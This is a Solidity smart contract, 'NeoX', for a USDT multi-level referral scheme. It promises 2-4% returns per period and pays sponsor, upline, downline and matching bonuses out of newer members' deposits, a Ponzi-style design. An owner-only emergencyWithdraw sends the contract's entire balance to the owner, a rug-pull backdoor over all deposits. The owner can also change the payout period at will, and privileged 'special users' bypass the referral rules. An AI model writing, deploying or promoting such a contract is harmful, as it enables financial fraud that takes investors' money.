// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract NeoX {
    address public owner;
    IERC20 public usdt;
    
    uint256 public constant JOIN_FEE = 10 * 1e18;
    uint256 public constant MIN_UPGRADE = 1 * 1e18;
    uint256 public constant DIRECT_INCOME_PCT = 5; // 5%
    uint256 public constant UPLINE_BONUS_PCT = 5;  // 5% per level (up to 10)
    uint256 public constant DOWNLINE_BONUS_PCT = 5; // 5% per level (up to 2)
    
    // Time periods
    uint256 public DAY_PERIOD = 5 minutes; // Will be 10 minutes for dev
    uint256 public constant BOOST_WINDOW = 20 minutes;
    
    struct User {
        bool isRegistered;
        address sponsor;
        uint256 idValue;
        uint256 totalDeposited;
        uint256 joinTimestamp;
        uint256 lastRoiTimestamp;
        uint256 totalRoiEarned;
        uint256 pendingIncome;
        uint256 directReferrals;
        uint256 businessValue;
        bool isBoosted2;
        bool isBoosted4;
        address[] referrals;
        // BDI fields
        uint256 bdiStartTime;
        uint256 lastBdiTimestamp;
        uint256 currentBdiTier;
        uint256 bdiEndTimestamp;
        uint256 totalBdiEarned;
        // Reward fields
        uint256 maxLegBusiness;      // Value of the strongest leg
        uint256 lastRewardTimestamp; // Matching reward settlement
        uint256 rewardEndTimestamp;
        uint256 totalRewardEarned;
        bool isRewardActive;
    }
    
    mapping(address => User) public users;
    mapping(address => bool) public specialUsers;
    mapping(address => mapping(address => uint256)) public legBusiness; // [user][referral] => business
    address[] public allUsers;
    
    // BDI Tiers
    uint256 public constant BDI_DURATION = 100; // periods
    uint256[] public bdiRates = [0, 10 * 1e18, 50 * 1e18, 100 * 1e18, 200 * 1e18];
    uint256[] public bdiThresholds = [0, 1000 * 1e18, 5000 * 1e18, 10000 * 1e18, 25000 * 1e18];

    // Matching Reward
    uint256 public constant MATCHING_REWARD_AMOUNT = 10 * 1e18; // 10 USDT
    uint256 public constant MATCHING_REWARD_DURATION = 100;     // 100 periods
    uint256 public constant MATCHING_THRESHOLD = 1000 * 1e18;   // 1000 USDT
    
    event Joined(address indexed user, address indexed sponsor);
    event Upgraded(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event IncomeReceived(address indexed user, address indexed from, uint256 amount, string typeOfIncome);

    constructor(address _rootUser, address _usdt, address[] memory _specialUsers) {
        owner = msg.sender;
        usdt = IERC20(_usdt);
        
        // Root user initialization
        users[_rootUser].isRegistered = true;
        users[_rootUser].idValue = JOIN_FEE;
        users[_rootUser].totalDeposited = JOIN_FEE;
        users[_rootUser].joinTimestamp = block.timestamp;
        users[_rootUser].lastRoiTimestamp = block.timestamp;
        allUsers.push(_rootUser);
        
        // Special Users mapping
        for(uint i=0; i<_specialUsers.length; i++) {
            specialUsers[_specialUsers[i]] = true;
            // TODO: Implement special privileges for these users (e.g., fee waivers, higher ROI, etc.)
        }
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    function setDayPeriod(uint256 _seconds) external onlyOwner {
        DAY_PERIOD = _seconds;
    }

    function join(address _sponsor) external {
        require(!users[msg.sender].isRegistered, "Already registered");
        require(users[_sponsor].isRegistered, "Invalid sponsor");
        
        usdt.transferFrom(msg.sender, address(this), JOIN_FEE);
        
        users[msg.sender].isRegistered = true;
        users[msg.sender].sponsor = _sponsor;
        users[msg.sender].idValue = JOIN_FEE;
        users[msg.sender].totalDeposited = JOIN_FEE;
        users[msg.sender].joinTimestamp = block.timestamp;
        users[msg.sender].lastRoiTimestamp = block.timestamp;
        
        allUsers.push(msg.sender);
        users[_sponsor].directReferrals++;
        users[_sponsor].referrals.push(msg.sender);
        
        _updateBusinessValue(msg.sender, JOIN_FEE);
        checkBoostStatus(_sponsor); // Trigger booster check
        _settleBdi(_sponsor);

        // 5% Direct Income immediately to sponsor
        uint256 directIncome = (JOIN_FEE * DIRECT_INCOME_PCT) / 100;
        usdt.transfer(_sponsor, directIncome);
        
        emit IncomeReceived(_sponsor, msg.sender, directIncome, "Direct Income");
        emit Joined(msg.sender, _sponsor);
    }

    function upgrade(uint256 _amount) external {
        require(users[msg.sender].isRegistered, "Not registered");
        require(_amount >= MIN_UPGRADE, "Amount too low");
        
        // CRITICAL: Settle old ROI at current idValue BEFORE upgrading stake
        _settleRoi(msg.sender);
        _settleBdi(msg.sender);
        
        usdt.transferFrom(msg.sender, address(this), _amount);
        
        users[msg.sender].idValue += _amount;
        users[msg.sender].totalDeposited += _amount;
        
        _updateBusinessValue(msg.sender, _amount);
        
        // 5% Direct Upgrade Income to sponsor
        address sponsor = users[msg.sender].sponsor;
        if (sponsor != address(0)) {
            uint256 upgradeIncome = (_amount * DIRECT_INCOME_PCT) / 100;
            users[sponsor].pendingIncome += upgradeIncome;
            emit IncomeReceived(sponsor, msg.sender, upgradeIncome, "Direct Upgrade Income");
        }
        
        emit Upgraded(msg.sender, _amount);
    }

    function checkBoostStatus(address _user) public {
        User storage u = users[_user];
        if (block.timestamp <= u.joinTimestamp + BOOST_WINDOW) {
            if (u.directReferrals >= 4 && !u.isBoosted4) {
                // Settle pending earnings at OLD rate before boosting
                _settleRoi(_user);
                _settleBdi(_user);
                u.isBoosted4 = true;
                u.isBoosted2 = false;
            } else if (u.directReferrals >= 2 && !u.isBoosted4 && !u.isBoosted2) {
                // Settle pending earnings at OLD rate before boosting
                _settleRoi(_user);
                _settleBdi(_user);
                u.isBoosted2 = true;
            }
        }
    }

    function getRoiRate(address _user) public view returns (uint256) {
        User memory u = users[_user];
        if (u.isBoosted4) return 4;
        if (u.isBoosted2) return 3;
        return 2;
    }

    function checkBdiTier(address _user) public view returns (uint256) {
        User storage u = users[_user];
        if (u.directReferrals < 10 && !specialUsers[_user]) return 0;
        
        for (uint i = 4; i >= 1; i--) {
            if (u.businessValue >= bdiThresholds[i]) {
                if(specialUsers[_user] && i < 1) return 1; // Special users get at least tier 1? No, rules say 10 directs.
                return i;
            }
        }
        return 0;
    }

    function pendingBdiIncome(address _user) public view returns (uint256) {
        User storage u = users[_user];
        if (u.currentBdiTier == 0 || u.lastBdiTimestamp == 0) return 0;
        
        uint256 endTime = block.timestamp > u.bdiEndTimestamp ? u.bdiEndTimestamp : block.timestamp;
        if (endTime <= u.lastBdiTimestamp) return 0;
        
        uint256 timePassed = endTime - u.lastBdiTimestamp;
        uint256 periods = timePassed / DAY_PERIOD;
        if (periods == 0) return 0;
        
        return periods * bdiRates[u.currentBdiTier];
    }

    function pendingRoiIncome(address _user) public view returns (uint256 amount, uint256 periodsSpent) {
        User storage u = users[_user];
        if (!u.isRegistered || u.lastRoiTimestamp == 0) return (0, 0);
        
        uint256 timePassed = block.timestamp - u.lastRoiTimestamp;
        periodsSpent = timePassed / DAY_PERIOD;
        if (periodsSpent == 0) return (0, 0);
        
        uint256 rate = getRoiRate(_user);
        uint256 roiAmount = (u.idValue * rate * periodsSpent) / 100;
        
        uint256 maxRoi = u.idValue * 2;
        if (u.totalRoiEarned + roiAmount > maxRoi) {
            roiAmount = maxRoi > u.totalRoiEarned ? maxRoi - u.totalRoiEarned : 0;
        }
        return (roiAmount, periodsSpent);
    }

    function pendingRewardIncome(address _user) public view returns (uint256) {
        User storage u = users[_user];
        if (!u.isRewardActive || u.lastRewardTimestamp == 0) return 0;
        
        uint256 endTime = block.timestamp > u.rewardEndTimestamp ? u.rewardEndTimestamp : block.timestamp;
        if (endTime <= u.lastRewardTimestamp) return 0;
        
        uint256 timePassed = endTime - u.lastRewardTimestamp;
        uint256 periods = timePassed / DAY_PERIOD;
        if (periods == 0) return 0;
        
        return periods * MATCHING_REWARD_AMOUNT;
    }

    function _settleReward(address _user) internal {
        uint256 pending = pendingRewardIncome(_user);
        if (pending > 0) {
            User storage u = users[_user];
            u.totalRewardEarned += pending;
            u.pendingIncome += pending;
            u.lastRewardTimestamp += (pending / MATCHING_REWARD_AMOUNT) * DAY_PERIOD;
            emit IncomeReceived(_user, address(0), pending, "Team Matching Reward");
        }
        
        User storage u2 = users[_user];
        if (!u2.isRewardActive) {
            uint256 otherLegsBusiness = u2.businessValue - u2.maxLegBusiness;
            if (u2.maxLegBusiness >= MATCHING_THRESHOLD && otherLegsBusiness >= MATCHING_THRESHOLD) {
                u2.isRewardActive = true;
                u2.lastRewardTimestamp = block.timestamp;
                u2.rewardEndTimestamp = block.timestamp + (MATCHING_REWARD_DURATION * DAY_PERIOD);
            }
        }
    }

    function _settleBdi(address _user) internal {
        uint256 pending = pendingBdiIncome(_user);
        if (pending > 0) {
            User storage u = users[_user];
            u.totalBdiEarned += pending;
            u.pendingIncome += pending;
            uint256 periods = pending / bdiRates[u.currentBdiTier];
            u.lastBdiTimestamp += (periods * DAY_PERIOD);
            emit IncomeReceived(_user, address(0), pending, "Business Development Income");
        }
        
        uint256 newTier = checkBdiTier(_user);
        if (newTier > users[_user].currentBdiTier) {
            users[_user].currentBdiTier = newTier;
            users[_user].bdiEndTimestamp = block.timestamp + (BDI_DURATION * DAY_PERIOD);
            users[_user].lastBdiTimestamp = block.timestamp;
            if (users[_user].bdiStartTime == 0) users[_user].bdiStartTime = block.timestamp;
        }
    }

    function _settleRoi(address _user) internal {
        (uint256 pending, uint256 periods) = pendingRoiIncome(_user);
        if (periods > 0) {
            User storage u = users[_user];
            // Update timestamp regardless of whether income was earned (to prevent backlog)
            u.lastRoiTimestamp += (periods * DAY_PERIOD);
            
            if (pending > 0) {
                u.totalRoiEarned += pending;
                u.pendingIncome += pending;
                _distributeUplineBonus(_user, pending);
                _distributeDownlineBonus(_user, pending);
                emit IncomeReceived(_user, address(0), pending, "ROI Accumulation");
            }
        }
    }

    function withdraw() external {
        _settleRoi(msg.sender);
        _settleBdi(msg.sender);
        _settleReward(msg.sender);
        
        User storage u = users[msg.sender];
        uint256 amount = u.pendingIncome;
        require(amount >= 1e18, "Min withdrawal 1 USDT");
        
        u.pendingIncome = 0;
        usdt.transfer(msg.sender, amount);
        
        emit Withdrawn(msg.sender, amount);
    }

    function _updateBusinessValue(address _user, uint256 _amount) internal {
        address previous = _user;
        address current = users[_user].sponsor;
        for (uint i = 0; i < 100; i++) {
            if (current == address(0)) break;
            
            // Track per-leg business
            legBusiness[current][previous] += _amount;
            if (legBusiness[current][previous] > users[current].maxLegBusiness) {
                users[current].maxLegBusiness = legBusiness[current][previous];
            }
            
            users[current].businessValue += _amount;
            _settleBdi(current);
            _settleReward(current);
            
            previous = current;
            current = users[current].sponsor;
        }
    }

    function _distributeUplineBonus(address _user, uint256 _roiAmount) internal {
        address current = users[_user].sponsor;
        uint256 bonus = (_roiAmount * UPLINE_BONUS_PCT) / 100;
        
        for (uint i = 0; i < 10; i++) {
            if (current == address(0)) break;
            if (specialUsers[current] || users[current].directReferrals >= 10) {
                users[current].pendingIncome += bonus;
                emit IncomeReceived(current, _user, bonus, "Upline Bonus");
            }
            current = users[current].sponsor;
        }
    }

    function _distributeDownlineBonus(address _user, uint256 _roiAmount) internal {
        uint256 levelPoolBonus = (_roiAmount * DOWNLINE_BONUS_PCT) / 100;
        
        // Level n+1
        address[] memory nPlus1 = users[_user].referrals;
        _distributeToLevel(nPlus1, levelPoolBonus, _user);
        
        // Level n+2 (collect all referrals of n+1)
        uint256 totalN2Count = 0;
        for(uint i=0; i<nPlus1.length; i++) {
            totalN2Count += users[nPlus1[i]].referrals.length;
        }
        
        if(totalN2Count > 0) {
            address[] memory nPlus2 = new address[](totalN2Count);
            uint256 k = 0;
            for(uint i=0; i<nPlus1.length; i++) {
                address[] memory refs = users[nPlus1[i]].referrals;
                for(uint j=0; j<refs.length; j++) {
                    nPlus2[k++] = refs[j];
                }
            }
            _distributeToLevel(nPlus2, levelPoolBonus, _user);
        }
    }

    function _distributeToLevel(address[] memory _levelMembers, uint256 _amount, address _from) internal {
        uint256 eligibleCount = 0;
        for(uint i=0; i<_levelMembers.length; i++) {
            if (specialUsers[_levelMembers[i]] || users[_levelMembers[i]].idValue >= 250 * 1e18) {
                eligibleCount++;
            }
        }
        
        if (eligibleCount > 0) {
            uint256 share = _amount / eligibleCount;
            for(uint i=0; i<_levelMembers.length; i++) {
                if (specialUsers[_levelMembers[i]] || users[_levelMembers[i]].idValue >= 250 * 1e18) {
                    users[_levelMembers[i]].pendingIncome += share;
                    emit IncomeReceived(_levelMembers[i], _from, share, "Downline Bonus");
                }
            }
        }
    }

    function emergencyWithdraw() external onlyOwner {
        uint256 balance = usdt.balanceOf(address(this));
        usdt.transfer(owner, balance);
    }

    function getReferrals(address _user) external view returns (address[] memory) {
        return users[_user].referrals;
    }
}
